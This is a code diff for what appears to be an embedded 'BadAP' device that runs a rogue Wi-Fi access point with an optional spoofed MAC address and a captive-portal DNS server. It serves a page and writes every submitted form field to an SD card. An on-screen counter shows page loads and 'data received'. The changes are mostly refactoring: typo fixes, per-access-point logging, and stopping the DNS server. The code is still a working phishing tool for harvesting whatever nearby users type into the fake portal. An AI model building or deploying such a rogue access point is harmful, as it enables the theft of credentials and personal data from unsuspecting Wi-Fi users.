@@ -10,9 +10,9 @@ namespace {
     const byte DNS_PORT = 53;
 
     int pageLoadCount = 0;
-    int dataRecievedCount = 0;
+    int dataReceivedCount = 0;
 
-    void setupAP(const String &ssid, const String &mac, int channel, const String &code) {
+    void setupAP(const String &ssid, const String &mac, int channel, const String &code, const String &apName) {
         WiFi.mode(WIFI_AP);
 
         if (mac != "") {
@@ -40,13 +40,13 @@ namespace {
             pageLoadCount++;
         });
 
-        server.on("/", HTTP_POST, [](AsyncWebServerRequest *request){
+        server.on("/", HTTP_POST, [apName](AsyncWebServerRequest *request){
             for (int i = 0; i < request->params(); i++) {
                 AsyncWebParameter* p = request->getParam(i);
-                SDManager::logEvent("DATA", p->name() + ": " + p->value());
+                SDManager::logData(apName, p->name() + ": " + p->value());
             }
             request->send(200, "text/html", "<html><body>Thanks</body></html>");
-            dataRecievedCount++;
+            dataReceivedCount++;
         });
 
         server.begin();
@@ -54,8 +54,10 @@ namespace {
 
     void stopServer() {
         server.end();
+        dnsServer.stop();
+
         pageLoadCount = 0;
-        dataRecievedCount = 0;
+        dataReceivedCount = 0;
     }
 
     void handleDNS() {
@@ -80,10 +82,8 @@ bool BadAPDisplay::scanInputs() {
 
             if (SDManager::loadAP(aps[index], ssid, mac, channel, code)) {
                 screenStage = ScreenStage::servingPage;
-                setupAP(ssid, mac, channel, code);
+                setupAP(ssid, mac, channel, code, aps[index]);
             }
-
-            screenStage = ScreenStage::servingPage;
         } else if (screenStage == ScreenStage::servingPage) {
 
         }
@@ -93,8 +93,6 @@ bool BadAPDisplay::scanInputs() {
         if (screenStage == ScreenStage::menu) {
             index = (index + 1) % apsLoaded;
             buttonPressed = true;
-        } else if (screenStage == ScreenStage::servingPage) {
-
         }
     }
 
@@ -126,7 +124,7 @@ void BadAPDisplay::displayScreen() {
     } else if (screenStage == ScreenStage::servingPage) {
         display.println(aps[index]);
         display.println("Page loaded " + String(pageLoadCount) + " times");
-        display.println("Data recieved " + String(dataRecievedCount) + " times");
+        display.println("Data received " + String(dataReceivedCount) + " times");
     }
 
     renderSidebar(Icon::ANTENNA_TOWER, Icon::RIGHT_ARROW, Icon::TARGET, Icon::DOWN_ARROW, -99);
